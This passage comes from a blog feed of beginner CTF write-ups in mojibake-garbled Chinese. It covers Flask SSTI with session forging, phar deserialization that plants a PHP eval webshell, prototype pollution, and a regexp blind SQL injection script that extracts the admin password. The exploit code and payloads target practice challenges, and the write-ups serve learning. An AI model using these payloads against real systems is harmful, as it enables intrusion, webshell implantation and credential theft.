class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, abort, send_file, session, render_template_string<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> secret_key<br><br>app = Flask(__name__)<br>app.secret_key = secret_key<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world</span>():  <span class="hljs-comment"># put application&#x27;s code here</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/cancanneed&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cancanneed</span>():<br>    all_filename = os.listdir(<span class="hljs-string">&#x27;./static/img/&#x27;</span>)<br>    filename = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;img.html&#x27;</span>, filename=filename, all_filename=all_filename)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(os.listdir(<span class="hljs-string">&#x27;./static/img/&#x27;</span>))&#125;</span> &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/download&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        filename = filename.replace(<span class="hljs-string">&#x27;../&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        filename = os.path.join(<span class="hljs-string">&#x27;static/img/&#x27;</span>, filename)<br>        <span class="hljs-built_in">print</span>(filename)<br>        <span class="hljs-keyword">if</span> (os.path.exists(filename)) <span class="hljs-keyword">and</span> (<span class="hljs-string">&quot;start&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> filename):<br>            <span class="hljs-keyword">return</span> send_file(filename)<br>        <span class="hljs-keyword">else</span>:<br>            abort(<span class="hljs-number">500</span>)<br>    <span class="hljs-keyword">else</span>:<br>        abort(<span class="hljs-number">404</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/backdoor&#x27;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor</span>():<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-built_in">print</span>(session.get(<span class="hljs-string">&quot;user&quot;</span>))<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;user&quot;</span>) <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            session[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&quot;guest&quot;</span><br>        name = session.get(<span class="hljs-string">&quot;user&quot;</span>)<br>        <span class="hljs-keyword">if</span> re.findall(<br>                <span class="hljs-string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,<br>                name):<br>            abort(<span class="hljs-number">500</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> render_template_string(<br>                <span class="hljs-string">&#x27;ç«Ÿç„¶ç»™&lt;h1&gt;%s&lt;/h1&gt;ä½ æ‰¾åˆ°äº†æˆ‘çš„åé—¨ï¼Œä½ ä¸€å®šæ˜¯ç½‘ç»œå®‰å…¨å¤§èµ›å† å†›å§ï¼ğŸ˜ &lt;br&gt; é‚£ä¹ˆ ç°åœ¨è½®åˆ°ä½ äº†!&lt;br&gt; æœ€åç¥æ‚¨ç©å¾—æ„‰å¿«!ğŸ˜&#x27;</span> % name)<br>    <span class="hljs-keyword">except</span> Exception:<br>        abort(<span class="hljs-number">500</span>)<br><br></code></pre></td></tr></table></figure><p>æ³¨æ„<code>/backdoor</code>åˆ™ä¸ªè·¯ç”±ï¼Œå¾ˆæ˜æ˜¾è¿™é‡Œå­˜åœ¨<code>SSTI</code></p><p><code>from config import secret_key</code></p><p>ç›®å½•ç©¿è¶Šæ‰¾<code>config.py</code>:</p><p><code>cancanneed?file=..././..././..././app/config.py</code></p><p><code>secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</code></p><p>æŠ“åŒ…çœ‹<code>SESSION</code>:</p><p><img src="/img/injectme4.png" alt="injectme4"></p><p><code>eyJ1c2VyIjoiZ3Vlc3QifQ.ZWMqqQ.pyASrkelEUhTYiw79-4TDZ-IzwM</code></p><p>ä¹‹å‰åœ¨<code>Kali</code>ä¸‹è¿‡ï¼Œç›´æ¥ç”¨äº†ï¼š</p><p><img src="/img/injectme5.png" alt="injectme5"></p><p>æ³¨å…¥ç‚¹å°±æ˜¯è¿™ä¸ª<code>guest</code>äº†ï¼Œä½†è¿‡æ»¤äº†æŒºå¤šä¸œè¥¿ã€‚å¯ä»¥æŠŠ<code>guest</code>æ¢æˆ<code>&#123;%print(7*7)%&#125;</code>çœ‹çœ‹ï¼š</p><p><code>&#123;&#39;user&#39;: &#39;&#123;%print(7*7)%&#125;&#39;&#125;</code></p><p><img src="/img/injectme6.png" alt="injectme6"></p><p><img src="/img/injectme7.png" alt="injectme7"></p><p>å…¶å®<code>+</code>è¿™ä¸œè¥¿è¢«è¿‡æ»¤äº†æ— æ‰€è°“çš„ï¼Œ<code>[&quot;__cla&quot;&quot;ss__&quot;]</code>èƒ½è¾¾åˆ°åŒæ ·çš„æ•ˆæœ</p><p><code>&#123;&#39;user&#39;: &#39;&#123;%print(7*7)%&#125;&#39;&#125;</code></p><p><code>&#123;%%20print([]["__cl""ass__")%20%&#125;</code></p><h2 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h2><p><img src="/img/phar1.png" alt="phar1"></p><p>æºç ä¸­æç¤º<code>class.php</code>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        @<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd); <span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„exec</span><br>    &#125;<br>&#125;<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br></code></pre></td></tr></table></figure><p><code>Pharååºåˆ—åŒ–</code>ï¼Œå‚è€ƒï¼š<code>https://mochu.blog.csdn.net/article/details/106909777</code></p><p>è¿™ä¸œè¥¿ä¸ªäººç†è§£ä¸»è¦å°±æ˜¯<code>phar</code>å‹ç¼©æ–‡ä»¶æ—¶ï¼Œä¼šåºåˆ—åŒ–ç”¨æˆ·å¯æ§çš„<code>meta-data</code>çš„å†…å®¹ã€‚ç„¶åå’Œ<code>phar://</code>åè®®é…åˆæŠŠè¿™ä¸ªå­—æ®µçš„å†…å®¹ååºåˆ—åŒ–ï¼Œä»è€Œè§¦å‘<code>__destruct()</code>ç­‰æ–¹æ³•ã€‚</p><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>å‚è€ƒï¼šhttps:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/CoLo/</span>p/<span class="hljs-number">16786627</span>.html<br><span class="hljs-number">1</span>ã€pharæ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ è‡³æœåŠ¡å™¨ <br><span class="hljs-regexp">//</span>å³è¦æ±‚å­˜åœ¨file_get_contents()ã€fopen()è¿™ç§å‡½æ•°<br><br><span class="hljs-number">2</span>ã€è¦æœ‰å¯åˆ©ç”¨çš„é­”æœ¯æ–¹æ³•<br><span class="hljs-regexp">//</span>è¿™ä¸ªçš„è¯ç”¨ä¸€ä½å¤§å¸ˆå‚…çš„è¯è¯´å°±æ˜¯åˆ©ç”¨é­”æœ¯æ–¹æ³•ä½œä¸º<span class="hljs-string">&quot;è·³æ¿&quot;</span><br><br><span class="hljs-number">3</span>ã€æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤<br><span class="hljs-regexp">//</span>ä¸€èˆ¬åˆ©ç”¨å§¿åŠ¿æ˜¯ä¸Šä¼ Pharæ–‡ä»¶åé€šè¿‡ä¼ªåè®®Pharæ¥å®ç°ååºåˆ—åŒ–ï¼Œä¼ªåè®®Pharæ ¼å¼æ˜¯`Phar:<span class="hljs-regexp">//</span>`è¿™ç§ï¼Œå¦‚æœè¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¢«è¿‡æ»¤å°±æ— æ³•å®ç°ååºåˆ—åŒ–<br><br><span class="hljs-number">4</span>ã€php.iniä¸­çš„phar.readonlyé€‰é¡¹ï¼Œéœ€è¦ä¸ºOffï¼ˆé»˜è®¤æ˜¯onï¼‰ã€‚<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨å‚è€ƒæ–‡ç« ä¸­çš„ä»£ç ç”Ÿæˆæˆ‘ä»¬éœ€è¦çš„<code>phar</code>æ–‡ä»¶ï¼š</p><p>è¦æ³¨æ„çš„å°±æ˜¯<code>execæ˜¯æ²¡å›æ˜¾çš„ï¼Œå¦‚æœæ˜¯evalæˆ‘ä»¬ç›´æ¥å¯ä»¥å†™å‘½ä»¤è¿›å»</code></p><p>çœ‹äº†å®˜æ–¹çš„wpï¼Œå­¦ä¹ äº†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//whatsphar.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;cmd=<span class="hljs-string">&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#x27;a&#x27;]);\&quot;&gt;/var/www/html/1.php&quot;</span>;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hacker.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>\</code>è¿™ä¸œè¥¿æ˜¯è½¬ä¹‰ç”¨çš„ï¼š</p><p><img src="/img/phar4.png" alt="phar4"></p><p>å¯¹äº<code>$a-&gt;cmd=&quot;echo \&quot;&lt;?=@eval(\\\$_POST[&#39;a&#39;]);\&quot;&gt;/var/www/html/1.php&quot;;</code></p><p>åˆ©ç”¨<code>echo</code>è¾“å‡º<code>&lt;?=@eval(\\\$_POST[&#39;a&#39;]);?&gt;</code>è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åæŠŠå®ƒé‡å®šå‘åˆ°<code>/var/www/html/1.php</code>ä¸­ã€‚ç®€å•è¯´å°±æ˜¯æŠŠä¸€å¥è¯æœ¨é©¬å†™åˆ°å¯¹åº”æ–‡ä»¶é‡Œã€‚</p><p>å¯ä»¥çœ‹ä¸‹<code>AI</code>è§£é‡Šï¼š</p><p><img src="/img/phar5.png" alt="phar5"></p><p>å†è¡¥å……ä¸€ä¸‹å…³äºè¿ç»­ä¸‰ä¸ªè½¬ä¹‰ç¬¦å·çš„è§£é‡Šã€‚ã€‚ç›´æ¥è´´æˆ‘å’Œ<code>x1r0z</code></p><p><img src="/img/phar9.png" alt="phar9"></p><p><img src="/img/phar10.png" alt="phar10"></p><p><img src="/img/phar11.png" alt="phar11"></p><p>å¦‚æœé¢˜ç›®ç»™çš„æ˜¯<code>eval</code>å°±æ²¡è¿™ä¹ˆéº»çƒ¦äº†ã€‚ã€‚</p><p>å¯ä»¥è‡ªå·±èµ·ä¸ªç¯å¢ƒï¼Œè®¿é—®<code>/whatphar.php</code>ï¼Œåœ¨æ ¹ç›®å½•åˆ·æ–°ä¸€ä¸‹å°±èƒ½å‡ºç°æˆ‘ä»¬éœ€è¦çš„<code>hacker.phar</code>æ–‡ä»¶äº†ã€‚</p><p>å¯¹äº<code>phar://</code>åè®®æ¥è¯´æ–‡ä»¶åä¸é‡è¦ï¼Œåªè¦å†…å®¹æ ¼å¼æ˜¯pharå³å¯è§¦å‘ååºåˆ—åŒ–ï¼š</p><p><img src="/img/phar3.png" alt="phar3"></p><p>ã€‚ã€‚è§¦å‘äº†è¿‡æ»¤ï¼Œæ£€æŸ¥äº†æ–‡ä»¶å†…å®¹å¹¶ä¸”ä¸å…è®¸å‡ºç°<code>__HALT_COMPILER();?&gt;</code>ã€‚</p><p>ä¸è¿‡å¯¹äº<code>Phar</code>æ–‡ä»¶ç»“æ„æ¥è¯´ï¼Œ<code>a sub</code>ä¸­è¦æ±‚<code>phar</code>æ–‡ä»¶å¿…é¡»ä»¥<code>__HALT_COMPILER();?&gt;</code>ç»“å°¾ï¼Œå¦åˆ™æ— æ³•è¢«<code>pharæ‰©å±•</code>è¯†åˆ«ä¸º<code>phar</code>æ–‡ä»¶ã€‚</p><p>æœäº†ä¸‹<code>pharæ–‡ä»¶è¿‡æ»¤__HALT_COMPILER();?&gt;</code>ï¼š<code>https://cloud.tencent.com/developer/article/2278965</code></p><p>å¯ä»¥åˆ©ç”¨<code>gizp</code>å°†ç”Ÿæˆçš„Pharæ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼š</p><p><img src="/img/phar8.png" alt="phar8"></p><p>ç„¶åå°†ç”Ÿæˆçš„<code>hello.jpg</code>ç›´æ¥ä¸Šä¼ ï¼Œä¼šç»™ä¸ªä¸Šä¼ è·¯å¾„ï¼š</p><p><img src="/img/phar6.png" alt="phar6"></p><p>è¿›<code>class.php</code>ï¼Œåˆ©ç”¨<code>phar</code>åè®®ååºåˆ—åŒ–ï¼š</p><p><code>file=phar://upload/f19fac1b1e7aa6a2df2d5cb5eada2d10.jpg</code></p><p>ç„¶åè®¿é—®<code>1.php</code>ï¼Œ<code>POST</code>ç»™<code>a</code>ä¼ å‚æ‰§è¡Œå‘½ä»¤å°±è¡Œäº†ã€‚</p><p><img src="/img/phar7.png" alt="phar7"></p><h2 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy"></a>OtenkiBoy</h2><p>è¿™é¢˜ä¸ä¼šã€‚ã€‚è·Ÿç€å®˜æ–¹<code>wp</code>åšçš„</p><p>ä¸‹è½½é™„ä»¶åå…ˆçœ‹<code>hint</code>:</p><p><img src="/img/otenboy1.png" alt="otenboy1"></p><p>è¿›å…¥<code>routes</code>ä¸‹(æ³¨æ„<code>merge</code>å‡½æ•°)ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//info.js</span><br><span class="hljs-keyword">const</span> &#123; mergeJSON, createDate &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./_components/utils&quot;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CONFIG</span> = <span class="hljs-title function_">mergeJSON</span>(<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config.default&quot;</span>), <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;../config&quot;</span>), <span class="hljs-literal">true</span>);<br><span class="hljs-comment">//submit.js</span><br><span class="hljs-keyword">const</span> &#123; rndID, mergeJSON &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./_components/utils&quot;</span>);<br><span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> <span class="hljs-title function_">insert2db</span>(<span class="hljs-title function_">mergeJSON</span>(<span class="hljs-variable constant_">DEFAULT</span>, data));<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨<code>require</code>å¼•å…¥äº†ä¸€ä¸ªåä¸º<code>mergeJSON</code>çš„å‡½æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//utils.js</span><br><span class="hljs-keyword">const</span> mergeJSON = <span class="hljs-keyword">function</span> (<span class="hljs-params">target, patch, deep = <span class="hljs-literal">false</span></span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> patch !== <span class="hljs-string">&quot;object&quot;</span>) <span class="hljs-keyword">return</span> patch;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(patch)) <span class="hljs-keyword">return</span> patch; <span class="hljs-comment">// do not recurse into arrays</span><br>    <span class="hljs-keyword">if</span> (!target) target = &#123;&#125;<br>    <span class="hljs-keyword">if</span> (deep) &#123; target = <span class="hljs-title function_">copyJSON</span>(target), patch = <span class="hljs-title function_">copyJSON</span>(patch); &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> patch) &#123;<br>        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">&quot;__proto__&quot;</span>) <span class="hljs-keyword">continue</span>; <span class="hljs-comment">//è¿™é‡Œè¿‡æ»¤äº†`__proto__ï¼Œå¯ä»¥ç”¨constructor.prototypeä»£æ›¿`</span><br>        <span class="hljs-keyword">if</span> (target[key] !== patch[key])<br>            target[key] = <span class="hljs-title function_">mergeJSON</span>(target[key], patch[key]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> target;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTFåšé¢˜è®°å½•_6</title>
    <link href="/2023/11/29/-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_6/"/>
    <url>/2023/11/29/-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_6/</url>
    
    <content type="html"><![CDATA[<p>åˆå­¦è€…çš„ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="/img/nctf2015sqli1.png" alt="nctf2015sqli1"></p><p><img src="/img/nctf2019sqli2.png" alt="nctf2019sqli2"></p><p><code>robots.txt</code>ä¸‹æç¤º<code>hint.txt</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$black_list</span> = <span class="hljs-string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;<br><br><br>If <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>] === admin<span class="hljs-string">&#x27;s password,</span><br><span class="hljs-string"></span><br><span class="hljs-string">Then you will get the flag;</span><br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢è¯­å¥ï¼š</p><p><code>sqlquery : select * from users where username=&#39;&#39; and passwd=&#39;&#39;</code></p><p>ä¸€å¼€å§‹æƒ³ç”¨<code>\</code>å»è½¬ä¹‰<code>username</code>çš„å•å¼•å·ç„¶åç”¨ä¸‡èƒ½å¯†ç ç™»å½•ï¼š</p><p><code>\</code>å’Œ<code>||1</code>ï¼ŒæŸ¥è¯¢è¯­å¥ä¼šå˜æˆï¼š</p><p><code>select * from users where username=&#39;\&#39; and passwd=&#39;||1&#39;</code>,æ­¤æ—¶ç”¨æˆ·åå°±æ˜¯<code>&#39; and passwd=</code>ï¼Œåé¢è¿ä¸€ä¸ª<code>||1</code>ã€‚ä½†ä¸çŸ¥é“åé¢é‚£ä¸ªå•å¼•å·è¦æ€ä¹ˆé—­åˆ(æ³¨é‡Šç¬¦è¢«å±è”½æ‰äº†)</p><p>çœ‹äº†wpå‘ç°è¿˜å¯ä»¥ç”¨<code>;</code>å’Œ<code>%00</code>æ‹¼æ¥å®ç°æˆªæ–­ï¼š</p><blockquote><p>php &lt; 5.3.4, ä¸” magic_quotes_gpc &#x3D; Off æ—¶å¯è¿›è¡Œ <code>%00</code> æˆªæ–­</p></blockquote><p>è¿™é‡Œæˆ‘ç†è§£çš„å°±æ˜¯åˆ©ç”¨<code>;</code>ç»ˆæ­¢äº†<code>passwd</code>éƒ¨åˆ†çš„è¾“å…¥ï¼Œç„¶åå†ç”¨<code>%00</code>æˆªæ–­åé¢çš„å•å¼•å·</p><p><code>username=123%5C&amp;passwd=||1;%00</code>:</p><p><img src="/img/nctfsqli1.png" alt="nctfsqli1"></p><p>é‡å®šå‘åˆ°äº†<code>welcome.php</code>ï¼Œä½†å®é™…è¿™ä¸œè¥¿æ²¡æ³•è®¿é—®ã€‚ã€‚</p><p><img src="/img/nctfsqli20193.png" alt="nctfsqli20193"></p><p><code>regexp</code>æ³¨å…¥ï¼š<code>æ­£åˆ™æ³¨å…¥</code>(å‚è€ƒï¼š<code>https://blog.csdn.net/l2872253606/article/details/125265138</code>)</p><p>æ¯”å¦‚åŒ¹é…<code>e</code>å¼€å¤´çš„ï¼š</p><p><img src="/img/nctf2019sqli4.png" alt="nctf2019sqli4"></p><p>å†çœ‹çœ‹<code>a</code>å¼€å¤´çš„ï¼š</p><p><img src="/img/nctf2019sqli5.png" alt="nctf2019sqli5"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™ä¹ˆåˆ¤æ–­ï¼š</p><p><code>username=123%5C&amp;passwd=||/**/passwd/**/regexp/**/&quot;^y&quot;;%00</code></p><p><img src="/img/nctf2019sqli6.png" alt="nctf2019sqli6"></p><p><code>username=123%5C&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code></p><p><img src="/img/nctf2019sqli7.png" alt="nctf2019sqli7"></p><p>æ³¨æ„ä¸¤ä¸ªé¡µé¢çš„ä¸åŒï¼Œå…¶å®è¿™ä¹ˆæå°±æœ‰ç‚¹åƒç›²æ³¨äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br>url = <span class="hljs-string">&quot;http://662edc83-8269-4f75-93e8-01b69e9c73a2.node4.buuoj.cn:81/&quot;</span><br>pw_fuzz = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;_&quot;</span>  <span class="hljs-comment"># å¯†ç å­—å…¸ï¼šå°å†™å­—æ¯å’Œæ•°å­—è¿˜æœ‰ä¸‹åˆ’çº¿</span><br>pw = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># adminçš„å¯†ç </span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pw_fuzz:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;\\&#x27;</span>,<br>            <span class="hljs-string">&#x27;passwd&#x27;</span>: <span class="hljs-string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>((pw+i),parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>))<br>        &#125;<br>        res = requests.post(url=url, data=data).text<br>        <span class="hljs-comment">#print(res)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;welcome.php&quot;</span>  <span class="hljs-keyword">in</span> res:<br>            pw = pw + i<br>            <span class="hljs-built_in">print</span>(pw)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>\</code>æ”¾äº†ä¸¤ä¸ªæ˜¯å› ä¸ºéœ€è¦è½¬ä¹‰ï¼Œåœ¨<code>python</code>ä¸­æœ‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;it\&#x27;s my code&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\\&#x27;</span>)<br><span class="hljs-comment">#it&#x27;s my code</span><br><span class="hljs-comment">#\</span><br></code></pre></td></tr></table></figure><p>ç”¨<code>parse.unquote(&#39;%00&#39;)</code>ä¸ºäº†é˜²æ­¢è½¬ä¹‰<code>%00</code>ï¼Œæ¯”å¦‚åœ¨ç™»å½•æ¡†ç›´æ¥æ‰“<code>%00</code>ä¼šè¢«è½¬ä¹‰æˆ<code>%2500</code>ï¼š</p><p><img src="/img/2019nctfsqli9.png" alt="2019nctfsqli9"></p><p>å½“ç„¶ä¹Ÿæœ‰å¸ˆå‚…ç›´æ¥ç”¨çš„<code>\x00</code>æˆªæ–­ï¼Œç»“æœä¸€æ ·çš„</p><p><img src="/img/nctf2019sqli8.png" alt="nctf2019sqli8"></p><p>you_will_never_know7788990</p><p>ç„¶åç›´æ¥ç™»å½•å°±è¡Œ</p><h2 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p><img 